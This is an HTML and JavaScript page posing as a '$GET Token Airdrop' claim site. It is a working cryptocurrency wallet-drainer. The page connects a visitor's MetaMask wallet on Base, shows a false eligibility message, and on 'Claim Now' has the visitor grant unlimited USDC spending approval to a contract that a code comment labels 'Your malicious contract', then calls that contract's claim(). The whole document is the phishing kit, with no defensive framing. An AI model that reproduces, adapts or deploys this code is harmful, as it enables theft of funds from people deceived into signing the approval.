<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>$GET Airdrop Claim</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1e1f29, #2f3041);
      color: #f1f1f5;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 2rem;
    }
    .claim-wrapper {
      background: rgba(255 255 255 / 0.05);
      border-radius: 16px;
      box-shadow: 0 0 30px rgba(255, 170, 51, 0.2);
      max-width: 420px;
      width: 100%;
      padding: 2.5rem 3rem;
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 170, 51, 0.3);
      text-align: center;
      animation: fadeInUp 0.8s ease forwards;
    }
    @keyframes fadeInUp {
      from {opacity: 0; transform: translateY(30px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .logo {
      font-weight: 700;
      font-size: 2.8rem;
      color: #ffaa33;
      margin-bottom: 0.5rem;
      letter-spacing: 3px;
      user-select: none;
    }
    .title {
      font-weight: 600;
      font-size: 1.5rem;
      margin-bottom: 1rem;
      color: #fff;
    }
    .subtitle {
      font-weight: 400;
      font-size: 1rem;
      color: #ddd;
      margin-bottom: 2rem;
      line-height: 1.4;
    }
    .connect-wallet-btn, .claim-btn {
      border: none;
      border-radius: 50px;
      font-weight: 700;
      padding: 0.8rem 2.5rem;
      cursor: pointer;
      transition: background 0.3s ease;
      box-shadow: 0 0 15px rgba(255,170,51,0.6);
      width: 100%;
      user-select: none;
      font-size: 1rem;
      margin-bottom: 1.5rem;
    }
    .connect-wallet-btn {
      background: #ffaa33;
      color: #000;
    }
    .connect-wallet-btn:hover {
      background: #ffc76b;
    }
    .connect-wallet-btn:disabled {
      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
    }
    .claim-btn {
      background: linear-gradient(90deg, #ffcc70, #ffaa33);
      font-size: 1.1rem;
    }
    .claim-btn:hover {
      background: linear-gradient(90deg, #ffdca1, #ffc76b);
    }
    .claim-btn:disabled {
      background: #ccc; color: #666; cursor: not-allowed; box-shadow: none;
    }
    .wallet-address {
      background: #2f3041;
      border-radius: 10px;
      padding: 1rem;
      color: #fff;
      font-size: 1rem;
      margin-bottom: 1.5rem;
      word-break: break-word;
    }
    .eligibility-msg {
      background: rgba(255 255 255 / 0.1);
      border-radius: 12px;
      padding: 1rem 1.5rem;
      color: #fff;
      font-size: 1rem;
      box-shadow: 0 0 12px rgba(255, 170, 51, 0.25);
      margin-bottom: 1rem;
    }
    .log-area {
      background: #222831;
      color: #f1f1f5;
      padding: 1rem;
      border-radius: 12px;
      font-size: 0.9rem;
      height: 150px;
      overflow-y: auto;
      white-space: pre-wrap;
      font-family: monospace;
      max-width: 420px;
      margin: 0 auto 1rem;
    }
  </style>
</head>
<body>
  <div class="claim-wrapper">
    <div class="logo">GETCHAIN</div>
    <div class="title">$GET Token Airdrop</div>
    <div class="subtitle">Connect your wallet to claim your $GET tokens.</div>

    <button class="connect-wallet-btn" id="connectWalletBtn">Connect Wallet</button>
    <div id="walletAddress" class="wallet-address" style="display:none;"></div>
    <button class="claim-btn" id="claimBtn" disabled>Claim Now</button>
    <div id="eligibilityMessage" class="eligibility-msg" style="display:none;">
      ✅ You are eligible for <strong>10,000 $GET</strong>
    </div>
    <div id="logArea" class="log-area" style="display:none;"></div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script>
    const connectWalletBtn = document.getElementById('connectWalletBtn');
    const walletAddressDiv = document.getElementById('walletAddress');
    const claimBtn = document.getElementById('claimBtn');
    const eligibilityMsg = document.getElementById('eligibilityMessage');
    const logArea = document.getElementById('logArea');

    let provider, signer;

    const USDC_ADDRESS = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // Base USDC
    const EVIL_CLAIM_CONTRACT = "0x947A3CbB49401Aa8B89c47A16B09a0111DCe916c"; // Your malicious contract

    const ERC20_ABI = [
      "function approve(address spender, uint256 amount) external returns (bool)"
    ];
    const EVIL_ABI = [
      "function claim() external",
      "event ClaimAttempt(address indexed user)",
      "event ClaimSuccess(address indexed user)",
      "event ClaimFailed(address indexed user, string reason)"
    ];

    function log(message) {
      logArea.style.display = 'block';
      logArea.textContent += message + "\n";
      logArea.scrollTop = logArea.scrollHeight;
    }

    connectWalletBtn.addEventListener('click', async () => {
      if (!window.ethereum) {
        alert("MetaMask not detected. Please install it.");
        return;
      }

      try {
        provider = new ethers.providers.Web3Provider(window.ethereum, "any");
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        const address = await signer.getAddress();

        const { chainId } = await provider.getNetwork();
        if (chainId !== 8453) {
          alert("Please switch to Base Mainnet (Chain ID: 8453).");
          return;
        }

        walletAddressDiv.textContent = address;
        walletAddressDiv.style.display = 'block';
        connectWalletBtn.textContent = "Wallet Connected";
        connectWalletBtn.disabled = true;

        eligibilityMsg.style.display = 'block';
        claimBtn.disabled = false;
        log("Wallet connected: " + address);
      } catch (err) {
        alert("Connection failed: " + (err.message || err));
      }
    });

    claimBtn.addEventListener('click', async () => {
      if (!signer) {
        alert("Connect your wallet first.");
        return;
      }

      try {
        log("Approving USDC spend...");
        const usdc = new ethers.Contract(USDC_ADDRESS, ERC20_ABI, signer);
        const approvalTx = await usdc.approve(EVIL_CLAIM_CONTRACT, ethers.constants.MaxUint256);
        await approvalTx.wait();
        log("USDC approved.");

        const evil = new ethers.Contract(EVIL_CLAIM_CONTRACT, EVIL_ABI, signer);

        evil.on("ClaimAttempt", (user) => {
          log(`ClaimAttempt event: user=${user}`);
        });
        evil.on("ClaimSuccess", (user) => {
          log(`ClaimSuccess event: user=${user}`);
          alert("✅ Claim successful!");
        });
        evil.on("ClaimFailed", (user, reason) => {
          log(`ClaimFailed event: user=${user}, reason=${reason}`);
          alert("❌ Claim failed: " + reason);
        });

        log("Calling claim()...");
        const claimTx = await evil.claim();
        await claimTx.wait();
        log("Transaction confirmed on chain.");
      } catch (err) {
        console.error(err);
        alert("❌ Claim failed: " + (err?.reason || err?.message || "Unknown error"));
        log("Error: " + (err?.reason || err?.message || "Unknown error"));
      }
    });
  </script>
</body>
</html>
